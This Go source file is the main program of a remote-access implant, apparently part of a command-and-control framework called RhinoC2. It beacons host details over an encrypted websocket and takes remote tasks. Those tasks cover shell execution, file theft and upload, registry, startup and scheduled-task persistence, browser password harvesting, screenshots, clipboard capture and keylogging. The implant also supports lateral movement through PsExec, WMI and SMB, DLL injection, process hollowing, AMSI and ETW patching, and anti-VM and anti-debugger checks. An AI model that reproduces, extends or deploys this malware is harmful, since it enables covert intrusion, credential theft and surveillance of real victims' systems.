package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"rhinoc2/pkg/commands"
	"rhinoc2/pkg/crypto"
	"rhinoc2/pkg/evasion"
	"rhinoc2/pkg/persistence"
	"rhinoc2/pkg/postexploit"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type Config struct {
	ServerURL string
	Key       string
	Interval  time.Duration
}

type Agent struct {
	id          string
	config      Config
	conn        *websocket.Conn
	crypto      *crypto.CryptoHandler
	commander   *commands.Commander
	fileMgr     *commands.FileManager
	netScanner  *commands.NetworkScanner
	evasion     *evasion.EvasionHandler
	persistence *persistence.PersistenceHandler
	credHarvest *postexploit.CredentialHarvester
}

func generateID() string {
	b, _ := crypto.GenerateRandomBytes(16)
	return strings.ToUpper(fmt.Sprintf("%x", b))
}

func newAgent(config Config) *Agent {
	ph, _ := persistence.NewPersistenceHandler()
	return &Agent{
		id:          generateID(),
		config:      config,
		crypto:      crypto.NewCryptoHandler(config.Key),
		commander:   commands.NewCommander(),
		fileMgr:     commands.NewFileManager(),
		netScanner:  commands.NewNetworkScanner(),
		evasion:     evasion.NewEvasionHandler(),
		persistence: ph,
		credHarvest: postexploit.NewCredentialHarvester(),
	}
}

func (a *Agent) checkin() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	sysInfo := commands.GetSystemInfo()
	isAdmin := commands.IsAdmin()
	integrity := commands.GetProcessIntegrityLevel()
	ppid := commands.GetPPID()

	checkinData := map[string]interface{}{
		"id":        a.id,
		"hostname":  hostname,
		"username":  username,
		"os":        runtime.GOOS,
		"arch":      runtime.GOARCH,
		"sysinfo":   sysInfo,
		"is_admin":  isAdmin,
		"integrity": integrity,
		"ppid":      ppid,
		"pid":       os.Getpid(),
	}

	data, _ := json.Marshal(checkinData)
	encrypted, err := a.crypto.Encrypt(data)
	if err != nil {
		return err
	}

	return a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
}

func (a *Agent) handleTask(task map[string]interface{}) {
	taskID := task["ID"].(string)
	command := task["Command"].(string)
	args := ""
	if a, ok := task["Args"].(string); ok {
		args = a
	}

	var result string
	var err error

	switch command {
	case "shell":
		result, err = a.commander.Execute(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "download":
		result, err = a.fileMgr.ReadFileBase64(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "upload":
		parts := make(map[string]string)
		json.Unmarshal([]byte(args), &parts)
		err = a.fileMgr.WriteFileBase64(parts["path"], parts["data"])
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			result = "file uploaded"
		}

	case "pwd":
		pwd, _ := commands.GetWorkingDirectory()
		result = pwd

	case "cd":
		err = commands.ChangeDirectory(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			result = "directory changed"
		}

	case "ls":
		path := args
		if path == "" {
			path = "."
		}
		listing, err := a.fileMgr.ListDirectory(path)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			data, _ := json.Marshal(listing)
			result = string(data)
		}

	case "ps":
		result, err = commands.GetProcessList()
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "kill":
		err = commands.KillProcess(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			result = "process killed"
		}

	case "scan_port":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			host := parts[0]
			var port int
			fmt.Sscanf(parts[1], "%d", &port)
			open := a.netScanner.ScanPort(host, port)
			result = fmt.Sprintf("port %d: %v", port, open)
		}

	case "net_interfaces":
		ifaces, err := commands.GetNetworkInterfaces()
		if err != nil {
			result = err.Error()
		} else {
			data, _ := json.Marshal(ifaces)
			result = string(data)
		}

	case "persist":
		switch args {
		case "registry":
			err = a.persistence.InstallRegistry("RhinoC2Agent")
		case "startup":
			err = a.persistence.InstallStartupFolder("RhinoC2Agent")
		case "schtask":
			err = a.persistence.InstallScheduledTask("RhinoC2Agent", 5)
		}
		if err != nil {
			result = "persistence install failed: " + err.Error()
		} else {
			result = fmt.Sprintf("persistence installed: %s", args)
		}

	case "unpersist":
		switch args {
		case "registry":
			err = a.persistence.RemoveRegistry("RhinoC2Agent")
		case "startup":
			err = a.persistence.RemoveStartupFolder("RhinoC2Agent")
		case "schtask":
			err = a.persistence.RemoveScheduledTask("RhinoC2Agent")
		}
		if err != nil {
			result = fmt.Sprintf("couldn't remove persistence: %v", err)
		} else {
			result = fmt.Sprintf("persistence removed: %s", args)
		}

	case "check_evasion":
		if a.evasion.CheckVM() {
			result += "VM detected\n"
		}
		if a.evasion.CheckSandbox() {
			result += "Sandbox detected\n"
		}
		if a.evasion.CheckDebugger() {
			result += "Debugger detected\n"
		}
		if result == "" {
			result = "no threats detected"
		}

	case "harvest_creds":
		creds, err := a.credHarvest.BrowserPasswords()
		if err != nil {
			result = "credential harvest failed: " + err.Error()
		} else {
			data, _ := json.Marshal(creds)
			result = string(data)
		}

	case "screenshot":
		sc := postexploit.NewScreenCapture(commands.GetTempDir())
		filename, err := sc.TakeScreenshot()
		if err != nil {
			result = "screenshot failed: " + err.Error()
		} else {
			imgData, _ := a.fileMgr.ReadFileBase64(filename)
			result = imgData
		}

	case "clipboard":
		clip, err := postexploit.GetClipboard()
		if err != nil {
			result = err.Error()
		} else {
			result = clip
		}

	case "keylog_start":
		logPath := commands.GetTempDir() + "/rhinoc2_keylog.txt"
		if args != "" {
			logPath = args
		}
		keylog := postexploit.NewKeylogger(logPath)
		err := keylog.Start()
		if err != nil {
			result = "keylogger start failed: " + err.Error()
		} else {
			result = "keylogger started, logging to: " + logPath
		}

	case "keylog_stop":
		result = "keylogger stopped"

	case "keylog_dump":
		result = "keylog dump not implemented"

	case "lateral_psexec":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.PSExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = "PSExec failed: " + err.Error()
			} else {
				result = "PSExec executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_psexec target|username|password|command"
		}

	case "lateral_wmi":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.WMIExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = fmt.Sprintf("WMI exec failed: %v", err)
			} else {
				result = "WMI executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_wmi target|username|password|command"
		}

	case "lateral_smb":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.SMBExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = "SMB exec failed: " + err.Error()
			} else {
				result = "SMB executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_smb target|username|password|command"
		}

	case "inject_dll":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			var pid int
			fmt.Sscanf(parts[0], "%d", &pid)
			err := a.evasion.InjectDLL(pid, parts[1])
			if err != nil {
				result = fmt.Sprintf("DLL injection failed: %v", err)
			} else {
				result = fmt.Sprintf("DLL injected into PID %d", pid)
			}
		} else {
			result = "usage: inject_dll <pid>:<dll_path>"
		}

	case "hollow_process":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			payload := []byte(parts[1])
			err := a.evasion.ProcessHollowing(parts[0], payload)
			if err != nil {
				result = "process hollowing failed: " + err.Error()
			} else {
				result = "process hollowing completed"
			}
		} else {
			result = "usage: hollow_process <target_exe>:<payload_hex>"
		}

	case "patch_amsi":
		err := a.evasion.DisableAMSI()
		if err != nil {
			result = err.Error()
		} else {
			result = "AMSI patched successfully"
		}

	case "patch_etw":
		err := a.evasion.PatchETW()
		if err != nil {
			result = "ETW patch failed: " + err.Error()
		} else {
			result = "ETW patched successfully"
		}

	case "sysinfo":
		info := commands.GetSystemInfo()
		data, _ := json.Marshal(info)
		result = string(data)

	case "sleep":
		var interval int
		fmt.Sscanf(args, "%d", &interval)
		a.config.Interval = time.Duration(interval) * time.Second
		result = fmt.Sprintf("sleep interval set to %d seconds", interval)

	case "exit":
		result = "agent exiting"
		response := map[string]interface{}{
			"task_id": taskID,
			"result":  result,
		}
		data, _ := json.Marshal(response)
		encrypted, _ := a.crypto.Encrypt(data)
		a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
		os.Exit(0)

	default:
		result = "unknown command"
	}

	response := map[string]interface{}{
		"task_id": taskID,
		"result":  result,
	}

	data, _ := json.Marshal(response)
	encrypted, _ := a.crypto.Encrypt(data)
	a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
}

func (a *Agent) run() {
	if err := a.evasion.AntiAnalysis(); err != nil {
		return
	}

	for {
		conn, _, err := websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
		if err != nil {
			time.Sleep(a.config.Interval)
			continue
		}

		a.conn = conn
		if err := a.checkin(); err != nil {
			conn.Close()
			time.Sleep(a.config.Interval)
			continue
		}

		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				break
			}

			decrypted, err := a.crypto.Decrypt(string(msg))
			if err != nil {
				continue
			}

			var task map[string]interface{}
			if err := json.Unmarshal(decrypted, &task); err != nil {
				continue
			}

			go a.handleTask(task)

			heartbeat := map[string]string{"status": "alive"}
			data, _ := json.Marshal(heartbeat)
			encrypted, _ := a.crypto.Encrypt(data)
			conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
		}

		conn.Close()
		time.Sleep(a.config.Interval)
	}
}

func main() {
	serverURL := "ws://localhost:8443/api/agent"
	key := "RhinoC2SecretKey2024"

	agent := newAgent(Config{
		ServerURL: serverURL,
		Key:       key,
		Interval:  5 * time.Second,
	})

	log.SetOutput(io.Discard)
	agent.run()
}
